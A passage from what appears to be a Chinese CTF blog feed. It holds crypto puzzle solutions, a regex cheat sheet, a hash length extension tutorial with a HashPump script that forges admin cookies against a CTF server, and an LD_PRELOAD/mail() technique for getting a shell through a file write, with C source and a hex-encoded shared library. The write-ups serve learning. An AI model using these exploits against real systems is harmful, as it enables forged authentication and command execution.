FJHPZiCuzl16MA63LpDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwChQ8DQJ8yMftTTWT7c5tF1rH1uI2PlQ4AYdckZfYrm6wY859YdAoQOAUKHgNUfxu3x4Gjt4+5xHSPPEfYYU+5N6L8ddR2PnOlcuA+37hcwxf91g1cIHQKEDgGH/WTcmdbUa+9vxNwxPer8uKbbhL42oXMnbt0hQOgXMM3eXzd4hdAhYGiNPtfaD7tqa3QzOKMuGfpcV4xG6GzBrTsECB0ChA4Bi9foow/ESmv0K4wV92ZGhwChQ4DQIUDoELDLD8wcxcM4+HDr0IEPbt0hQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwChQ4DQIUDoECB0CBA6BAgdAoQOAUKHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwChQ4DQIUDoECB0CBA6BAgdAoQOAUKHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwChw+39+vUPmuaZZgm+XxcAAAAASUVORK5CYII=&apos;&apos;&apos;f.write(base64.b64decode(a)) 打开即是flag 3-2 easy_py下载下来一个压缩包,先试试伪加密，用zipCenOp打开之后发现果然加密标志没了。然后把flag.pyc反编译一下,一个加密函数(队友说是rc4)，不过需要个key。于是又打开了key文件，发现是一串熟悉的东西,懒得写脚本，直接用编辑器的替换功能，从9开始替换，把这么一串东西变成一个表达式得到key之后替换掉加密算法中的key，然后根据加密算法写个解密算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# uncompyle6 version 2.9.10# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.11 (v2.7.11:6d1b6a68f775, Dec 5 2015, 20:40:30) [ MSC v.1500 64 bit (AMD64)]# Embedded file name: /home/ctf/WDCTF2017/test.py# d: 2017-09-08 19:54:01import randomimport base64from hashlib import sha1strCipher = &apos;Xw6aM5fbiQOkkezmbdLC7Gbnj5siJJc5DpzkVjtdKPKT3A==&apos;key = &apos;I_4m-k3y&apos;def crypt(data, key): x = 0 box = range(256) for i in range(256): x = (x + box[i] + ord(key[i % len(key)])) % 256 box[i], box[x] = box[x], box[i] x = y = 0 out = [] for char in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256])) return &apos;&apos;.join(out)def decrypt(data, key): x = 0 box = range(256) for i in range(256): x = (x + box[i] + ord(key[i % len(key)])) % 256 box[i], box[x] = box[x], box[i] x = y = 0 data1=[] for char in data: x=(x+1)%256 y=(y+box[x])%256 box[x],box[y] = box[y], box[x] data1.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256])) return &apos;&apos;.join(data1) def encode(data, key, encode=base64.b64encode, salt_length=16): salt = &apos;&apos; for n in range(salt_length): salt += chr(random.randrange(256)) #salt=&apos;11&apos; data = salt + crypt(data, sha1(key + salt).digest()) if encode: data = encode(data) return datadef decode(data, key, decode=base64.b64decode, salt_length=16): salt = &apos;&apos; if decode: data=decode(data) for n in range(salt_length): salt += chr(random.randrange(256)) #salt=&apos;11&apos; salt=data[:16] out=data[16:] return decrypt(out,sha1(key + salt).digest()) print decode(strCipher,key) 得到flag 4-1 简单加密py文件还是个加密函数123456789101112131415161718192021222324252627282930313233from hashlib import sha256def xor(a,b): return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])def HASH(data): return sha256(data).digest()[:8]def bes_encrypt(subkeys, data): i = 0 d1 = data[:8] d2 = data[8:] for i in subkeys: d1 = xor(xor(HASH(d2),i),d1) d1,d2 = d2,d1 print (d2+d1).encode(&apos;hex&apos;) return d2 + d1def key_schedule(key): subKeys = [] subKey = key for i in xrange(16): subKey = HASH(subKey) subKeys.append(subKey) return subKeysdef bes(key,data): subKeys = key_schedule(key) return bes_encrypt(subKeys, data).encode(&apos;hex&apos;)if __name__ == &quot;__main__&quot;: print bes(&apos;wdctfhhh&apos;,&apos;This_is_the_flag&apos;) # 19714d622d75f32fd9bd98feaa93df0d 因为没有随机数什么的，根据加密函数稍微改改写个解密函数就好了12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from hashlib import sha256def xor(a,b): return &apos;&apos;.join([chr(ord(i)^ord(j)) for i,j in zip(a,b)])def HASH(data): return sha256(data).digest()[:8]def bes_encrypt(subkeys, data): i = 0 d1 = data[:8] d2 = data[8:] print d2.encode(&apos;hex&apos;) for i in subkeys: d1 = xor(xor(HASH(d2),i),d1) d1,d2 = d2,d1 return d2 + d1def bes_decrypt(subkeys,data): i=0 d2= data[:16] d2=d2.decode(&apos;hex&apos;) d1= data[16:] d1=d1.decode(&apos;hex&apos;) subkeys=subkeys[::-1] for i in subkeys: d1,d2=d2,d1 d1 = xor(xor(HASH(d2),i),d1) return d1+d2def key_schedule(key): subKeys = [] subKey = key for i in xrange(16): subKey = HASH(subKey) subKeys.append(subKey) return subKeysdef bes(key,data): subKeys = key_schedule(key) return bes_encrypt(subKeys, data).encode(&apos;hex&apos;)def besdd(key,data): subKeys = key_schedule(key) return bes_decrypt(subKeys, data)if __name__ == &quot;__main__&quot;: print besdd(&apos;wdctfhhh&apos;,&apos;19714d622d75f32fd9bd98feaa93df0d&apos;) # 19714d622d75f32fd9bd98feaa93df0d 附加题:万里挑一下载下来一个压缩包,里面1024个文件，随便点个进去都是一堆十六进制，想想万里挑一，感觉像是在里面找一个正常的东西，就随便点点。发现有点不正常的地方，，这个文件和前面的文件有很明显的时间差，像是前面是用什么脚本生成的，而从这里开始是加进去的东西。 那就点开这个文件，发现很标准的flag形式,WDFLAG{},那就是它了。不过一开始并不知道什么加密方法，用ascii试了试发现不对,然后仔细观察发现每一位都小于10，而且都只有两位，第二位都小于等于4，再想到提示提到短信，那应该就是手机键盘加密了，解开之后再用凯撒加密解开就得到了flag。]]></content>
  </entry>
  <entry>
    <title><![CDATA[常用正则表达式]]></title>
    <url>%2F2017%2F09%2F18%2F%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[挺实用 .at可以匹配 cat sat mat #at点可以匹配任意字符 [a-z]at[a-zA-Z]方括号中匹配一个集合类 [^a-z]表示不属于该集合里的字符 \* 表示可以被重复 0 次或更多次\+ 表示可以被重复 1 次或更多次 [[:alnum:]]+表示至少有一个字母字符 ()圆括号用于分割子表达式 (very )*large可以匹配 very large、very very large、large {}花括号表示允许重复的次数{3} 表示重复 3 次，{2,4} 表示重复 2~4 次，{2,} 表示至少重复 2 次 ^bob表示在字符串开始处匹配 bob com$表示在字符串结尾处匹配 com ^[a-zA-Z]$表示只匹配一个字母字符的字符串 用竖线来表示分支选择com|edu|net表示匹配 com 或 edu 或 net 匹配特殊字符时，需要使用反斜杠 \ 来进行转义，在 PHP 中还需要再进行转义一次。匹配电子邮件地址^[a-zA-Z0-9_\-.]+@[a-zA-Z0-9\-]+\.[a-zA-Z0-9\-.]+$ 正则查找字符串ereg(string pattern, string search, array [matches]);eregi 不区分大小写 正则替换字符串string ereg_replace(string pattern, string replacement, string search); 正则分割字符串array split(string pattern, string search [, int max]);]]></content>
  </entry>
  <entry>
    <title><![CDATA[hash长度扩展攻击]]></title>
    <url>%2F2017%2F09%2F18%2Fhash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[感觉挺有用就加了进来 原理首先要讲hash算法(例如md5)，但是也不需要太了解，只需要知道以下几点就可以了1231.MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算 2.我们关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。 3.MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量IV，这一点很关键！！！ 有点绕，用个例子讲一下怎么填充比如说计算字符串”admin”十六进制0x64676d696e这里与448模512不同余，补位后数据如下10x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000 注意！下图中8是怎么来的！比特第一位补位1，其余为0，那么admin后面（二进制补位1000…000） 注意！下图中框框中是啥！是全部要加密明文的长度！这里长度不包含填充的长度！而且注意是比特数！而且我们需要注意一点MD5中存储的都是小端方式！MD5中存储的都是小端方式！MD5中存储的都是小端方式！重要的事情说三遍，举个例子：假如我们这一块值为0x12345678那么在MD5运算时候存储的顺序是 0x78563412这也是之所以后8字节为长度，而第1字节先有数据的原因 攻击原理主要看刚才讲的第三点 这样的话，假设secret只知道位数的话，将其填充成secret1，其中n=hash(secret)=hash(secret1)已知，则hash(secret1+任意数据)都可以求出，因为(secret1+任意数据)会被分为很多组，第一组为secret1，则第一组生成的向量即为n,直接用于接下来的运算即可。所以hash扩展长度攻击我理解就是，已知secret长度和hash值，就可以求出(secret+任意数据)的hash值。如果一个应用程序是这样操作的：123准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值 这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值。 再比如，一个网站在用户下载文件之前需验证下载权限。这个网站会用如下的算法产生一个关于文件名的MAC：123def create_mac(key, fileName) return Digest::SHA1.hexdigest(key + fileName)End 最终产生的URL会是这样：1http://example.com/download?file=report.pdf&amp;mac=563162c9c71a17367d44c165b84b85ab59d036f9 用户发起请求要下载一个文件时，将会执行下面这个函数：12345678def verify_mac(key, fileName, userMac) validMac = create_mac(key, filename) if (validMac == userMac) do initiateDownload() else displayError() endEnd 这样，只有当用户没有擅自更改文件名时服务器才会执行initiateDownload()开始下载。实际上，这种生成MAC的方式，给攻击者在文件名后添加自定义字串留下可乘之机。 已知salt长度题目：http://www.shiyanbar.com/ctf/1848 1234567891011121314if (!empty($_COOKIE["getmein"])) &#123; if (urldecode($username) === "admin" &amp;&amp; urldecode($password) != "admin") &#123; if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) &#123; echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); &#125; else &#123; die ("Your cookies don't match up! STOP HACKING THIS SITE."); &#125; &#125; else &#123; die ("You are not an admin! LEAVE."); &#125;&#125; 1setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7)); 其中已知sample-hash，即hash(secret+”adminadmin”)，这时候构造username=”admin”，password=”admin/x80/00…../00gg”，其中使得secret+username+password恰好分为两组，第一组和secret+adminadmin一样(因为前面求hash(secret+”adminadmin”)时需要填充成hash(secret+”adminadmin”+”/x80/00…”)),第二组为gg,这时候求hash(secret+username+password)等价于求hash(gg),但是初始向量变成第一组的hash值(已知),然后构造cookie中的getmein提交即可 解法:使用hashpump解，其中安装如下： HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。（至于别的文章提到了MD4、RIPEMD-160、SHA-0、WHIRLPOOL等也可以构造长度扩展攻击，等以后再研究。）12345git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install 至于想在python里实现hashpump，可以使用hashpumpy这个插件：1pip install hashpumpy 至于想在python里实现hashpump，可以使用hashpumpy这个插件：123python&gt;&gt;&gt; import hashpumpy&gt;&gt;&gt; help(hashpumpy.hashpump) 第一行是得到的hash值,即hash(secret+’adminadmin’)第二行是已知数据,即’adminadmin’第三行是总长度第四行是要添加的数据(这个随意) 将得到的第一行设置到cookie的getmein中，第二行为username+password的值 未知salt长度题目链接:web.jarvisoj.com:32778/index.phpweb题第一操作,先扫一波目录,最近换了个新工具https://github.com/ring04h/weakfilescan看到有源码泄露,访问index.php~下载下来源码,因为下载下来的是一串乱七八糟的,需要去恢复一下。 在linux下用file看一下文件类型,发现是swap文件的话加上后缀什么的，然后1vim -r index.php.swp 恢复一下就好了。源码如下:12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt; body &#123; background:gray; text-align:center; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $auth = false; $role = &quot;guest&quot;; $salt = if (isset($_COOKIE[&quot;role&quot;])) &#123; $role = unserialize($_COOKIE[&quot;role&quot;]); $hsh = $_COOKIE[&quot;hsh&quot;]; if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie(&apos;role&apos;,$s); $hsh = md5($salt.strrev($s)); setcookie(&apos;hsh&apos;,$hsh); &#125; if ($auth) &#123; echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;; &#125; ?&gt; &lt;/body&gt;&lt;/html&gt; 发现是hash长度扩展攻击，唯一不同的是不知道secret的长度 首先观察服务器端给了什么信息,发现服务器端返回了$role=&#39;s:5:&quot;guest&quot;;&#39;以及$hsh=md5(salt+strrev($role))然后需要我们求的是md5(salt+strrev(admin)) 先看代码吧12345678910111213141516171819202122232425import hashpumpyimport urllibimport requestsfor i in range(1,30): m=hashpumpy.hashpump('3a4727d57463f122833d9e732f94e4e0',';\"tseug\":5:s',';\"nimda\":5:s',i) print i url='http://120.26.131.152:32778/' digest=m[0] message=urllib.quote(urllib.unquote(m[1])[::-1]) cookie='role='+message+'; hsh='+digest #print cookie headers=&#123; 'cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate'&#125; print headers re=requests.get(url=url,headers=headers) print re.text if "Welcome" in re.text: print re; break 代码是在linux下运行的，因为使用了hashpumpy库，这个库我在win下安装不成功..使用说明如下:1234567891011121314151617&gt;&gt;&gt; import hashpumpy&gt;&gt;&gt; help(hashpumpy.hashpump)Help on built-in function hashpump in module hashpumpy:hashpump(...) hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message) Arguments: hexdigest(str): Hex-encoded result of hashing key + original_data. original_data(str): Known data used to get the hash result hexdigest. data_to_add(str): Data to append key_length(int): Length of unknown data prepended to the hash Returns: A tuple containing the new hex digest and the new message.&gt;&gt;&gt; hashpumpy.hashpump(&apos;ffffffff&apos;, &apos;original_data&apos;, &apos;data_to_add&apos;, len(&apos;KEYKEYKEY&apos;))(&apos;e3c4a05f&apos;, &apos;original_datadata_to_add&apos;) 所以代码中,$hsh的值中已知的部分为strrev(serialize(&#39;guest&#39;)),即&#39;;\&quot;tseug\&quot;:5:s&#39;,&#39;,而需要填充的部分为&#39;;\&quot;nimda\&quot;:5:s&#39;,长度则用爆破。 此时构造出来的cookie为1role=s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B; hsh=fcdc3840332555511c4e4323f6decb07 这样的cookie传到服务端,首先根据源码,会将role反序列化之后比较是否等于admin,这时候会发现php反序列化也存在%00截断,所以第一个判断过了 接下来会判断$hsh是否等于md5($salt+strrev($role)),而md5($salt+strrev($role))等于md5($salt+strrev(s:5:&quot;admin&quot;;%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s:5:&quot;guest&quot;;))等于md5($salt+(;\&quot;tseug\&quot;:5:s%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00;\&quot;nimda\&quot;:5:s)),而其中md5($salt+(;\&quot;tseug\&quot;:5:s%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00)等于已知的3a4727d57463f122833d9e732f94e4e0,而这个值也将作为下一个分组的输入,这个和hashpump的运算结果是一样的,所以运行一下代码:]]></content>
  </entry>
  <entry>
    <title><![CDATA[文件任意写入getshell]]></title>
    <url>%2F2017%2F09%2F18%2F%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5getshell%2F</url>
    <content type="text"><![CDATA[通过文件任意写入来getshell函数里屏蔽了所有的命令执行函数以及文件读取函数，但是允许文件的任意写入，这里仅提供一种思路：将事先编译好的共享库文件写到web根目录下，然后通过putenv函数设置环境变量中的LD_PRELOAD为该so文件,并使用mail函数调用/usr/bin/sendmail，最终执行共享库文件中的恶意代码。编写hack.c文件如下：1234567891011#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;system("ls &gt;p01.txt");&#125;intgeteuid() &#123;if (getenv("LD_PRELOAD") == NULL) &#123; return 0; &#125;unsetenv("LD_PRELOAD");payload();&#125; 编译该共享库文件，生成hack.so文件： gcc -c -fPIChack.c -o hack gcc -shared hack -o hack.so 使用如下php代码将so文件读取成十六进制串：1234&lt;?php$content=file_get_contents("hack.so");echo bin2hex($content);?&gt; 最终将十六进制字串写入web根目录下123$content = &quot;7f454c4602010100000000000000000003003e0001000000c006000000000000400000000000000070110000000000000000000040003800070040001c0019000100000005000000000000000000000000000000000000000000000000000000bc08000000000000bc0800000000000000002000000000000100000006000000f80d000000000000f80d200000000000f80d2000000000005002000000000000580200000000000000002000000000000200000006000000180e000000000000180e200000000000180e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e574640400000010080000000000001008000000000000100800000000000024000000000000002400000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f80d000000000000f80d200000000000f80d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e55008d40027068f204a76998e616d17fd281ea5656c800000000030000000a000000010000000600000088c82001801440090a0000000c0000000e0000004245d5ecbbe3927cd871581cb98df10eead3ef0eec9273f0cf49499c0000000000000000000000000000000000000000000000000000000003000900280600000000000000000000000000008c00000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007d0000001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000610000002000000000000000000000000000000000000000930000001200000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000a60000001000160048102000000000000000000000000000b90000001000170050102000000000000000000000000000ad00000010001700481020000000000000000000000000001000000012000900280600000000000000000000000000001600000012000c00f00700000000000000000000000000008400000012000b00ba0700000000000034000000000000007500000012000b00a8070000000000001200000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007061796c6f61640073797374656d006765746575696400676574656e7600756e736574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000002000000020000000000020000000200010001000100010001000100010000000000010001009c0000001000000000000000751a690900000200be00000000000000f80d20000000000008000000000000007007000000000000000e20000000000008000000000000003007000000000000100e2000000000000800000000000000100e200000000000d80f20000000000006000000030000000000000000000000e00f20000000000006000000050000000000000000000000e80f20000000000006000000060000000000000000000000f00f20000000000006000000080000000000000000000000f80f200000000000060000000900000000000000000000001810200000000000070000000200000000000000000000002010200000000000070000000400000000000000000000002810200000000000070000000500000000000000000000003010200000000000070000001000000000000000000000003810200000000000070000000700000000000000000000004010200000000000070000000900000000000000000000004883ec08488b05ad0920004885c07405e8430000004883c408c30000000000000000000000000000ff35b2092000ff25b40920000f1f4000ff25b20920006800000000e9e0ffffffff25aa0920006801000000e9d0ffffffff25a20920006802000000e9c0ffffffff259a0920006803000000e9b0ffffffff25920920006804000000e9a0ffffffff258a0920006805000000e990ffffff488d0588092000488d3d7a092000554829f84889e54883f80e77025dc3488b05f40820004885c074f25dffe00f1f4000488d0551092000488d3d4a092000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b15cf0820004885d274f25d4889c6ffe20f1f4000803d1109200000752748833db708200000554889e5740c488d3dc2062000e85dffffffe868ffffff5dc605e808200001f3c366666666662e0f1f84000000000048833d90062000007426488b05670820004885c0741a55488d3d7a0620004889e5ffd05de957ffffff0f1f8000000000e94bffffff0f1f00554889e5488d3d46000000e8b8feffff5dc3554889e5488d3d40000000e896feffff4885c07507b800000000eb16488d3d28000000e8befeffffb800000000e8a4feffff5dc366904883ec084883c408c36c73203e7030312e747874004c445f5052454c4f414400011b033b240000000300000040feffff4000000098ffffff68000000aaffffff88000000000000001400000000000000017a5200017810011b0c070890010000240000001c000000f8fdffff70000000000e10460e184a0f0b770880003f1a3b2a332422000000001c0000004400000028ffffff1200000000410e108602430d064d0c07080000001c000000640000001affffff3400000000410e108602430d066f0c0708000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000700700000000000030070000000000000000000000000000100e20000000000001000000000000009c000000000000000c0000000000000028060000000000000d00000000000000f0070000000000001900000000000000f80d2000000000001b0000000000000008000000000000001a00000000000000000e2000000000001c000000000000000800000000000000f5feff6f00000000f0010000000000000500000000000000c803000000000000060000000000000030020000000000000a00000000000000ca000000000000000b000000000000001800000000000000030000000000000000102000000000000200000000000000900000000000000014000000000000000700000000000000170000000000000098050000000000000700000000000000d8040000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f00000000b804000000000000ffffff6f000000000100000000000000f0ffff6f000000009204000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000180e200000000000000000000000000000000000000000006606000000000000760600000000000086060000000000009606000000000000a606000000000000b6060000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31312900002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f0010000000000004000000000000000030000000000000008000000000000000000000000000000380000000b000000020000000000000030020000000000003002000000000000980100000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000c803000000000000c803000000000000ca0000000000000000000000000000000100000000000000000000000000000048000000ffffff6f020000000000000092040000000000009204000000000000220000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000b804000000000000b804000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000d804000000000000d804000000000000c0000000000000000300000000000000080000000000000018000000000000006e000000040000000200000000000000980500000000000098050000000000009000000000000000030000000a0000000800000000000000180000000000000078000000010000000600000000000000280600000000000028060000000000001a00000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000005006000000000000500600000000000070000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c006000000000000c006000000000000300100000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000f007000000000000f00700000000000009000000000000000000000000000000040000000000000000000000000000008a000000010000000200000000000000f907000000000000f907000000000000170000000000000000000000000000000100000000000000000000000000000092000000010000000200000000000000100800000000000010080000000000002400000000000000000000000000000004000000000000000000000000000000a0000000010000000200000000000000380800000000000038080000000000008400000000000000000000000000000008000000000000000000000000000000aa0000000e0000000300000000000000f80d200000000000f80d0000000000000800000000000000000000000000000008000000000000000000000000000000b60000000f0000000300000000000000000e200000000000000e0000000000000800000000000000000000000000000008000000000000000000000000000000c2000000010000000300000000000000080e200000000000080e0000000000000800000000000000000000000000000008000000000000000000000000000000c7000000010000000300000000000000100e200000000000100e0000000000000800000000000000000000000000000008000000000000000000000000000000d4000000060000000300000000000000180e200000000000180e000000000000c001000000000000040000000000000008000000000000001000000000000000dd000000010000000300000000000000d80f200000000000d80f0000000000002800000000000000000000000000000008000000000000000800000000000000e2000000010000000300000000000000001020000000000000100000000000004800000000000000000000000000000008000000000000000800000000000000eb000000080000000300000000000000481020000000000048100000000000000800000000000000000000000000000004000000000000000000000000000000f0000000010000003000000000000000000000000000000048100000000000002d000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000007510000000000000f900000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000701800000000000070050000000000001b0000002b00000008000000000000001800000000000000090000000300000000000000000000000000000000000000e01d000000000000f8010000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300300200000000000000000000000000000000000003000400c80300000000000000000000000000000000000003000500920400000000000000000000000000000000000003000600b80400000000000000000000000000000000000003000700d80400000000000000000000000000000000000003000800980500000000000000000000000000000000000003000900280600000000000000000000000000000000000003000a00500600000000000000000000000000000000000003000b00c00600000000000000000000000000000000000003000c00f00700000000000000000000000000000000000003000d00f90700000000000000000000000000000000000003000e00100800000000000000000000000000000000000003000f00380800000000000000000000000000000000000003001000f80d20000000000000000000000000000000000003001100000e20000000000000000000000000000000000003001200080e20000000000000000000000000000000000003001300100e20000000000000000000000000000000000003001400180e20000000000000000000000000000000000003001500d80f2000000000000000000000000000000000000300160000102000000000000000000000000000000000000300170048102000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001200080e20000000000000000000000000001900000002000b00c00600000000000000000000000000002e00000002000b00f00600000000000000000000000000004100000002000b00300700000000000000000000000000005700000001001700481020000000000001000000000000006600000001001100000e20000000000000000000000000008d00000002000b00700700000000000000000000000000009900000001001000f80d2000000000000000000000000000b80000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000bf00000001000f00b8080000000000000000000000000000cd00000001001200080e2000000000000000000000000000000000000400f1ff00000000000000000000000000000000d900000001001300100e2000000000000000000000000000e600000001001400180e2000000000000000000000000000ef0000000100160048102000000000000000000000000000fb00000001001600001020000000000000000000000000001101000012000000000000000000000000000000000000002501000020000000000000000000000000000000000000004101000010001600481020000000000000000000000000004801000012000c00f00700000000000000000000000000004e01000012000000000000000000000000000000000000006201000020000000000000000000000000000000000000007101000012000b00ba0700000000000034000000000000007901000012000b00a8070000000000001200000000000000810100001000170050102000000000000000000000000000860100001000170048102000000000000000000000000000920100002000000000000000000000000000000000000000a60100001200000000000000000000000000000000000000bc0100002000000000000000000000000000000000000000d60100002200000000000000000000000000000000000000f201000012000900280600000000000000000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e65730072656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746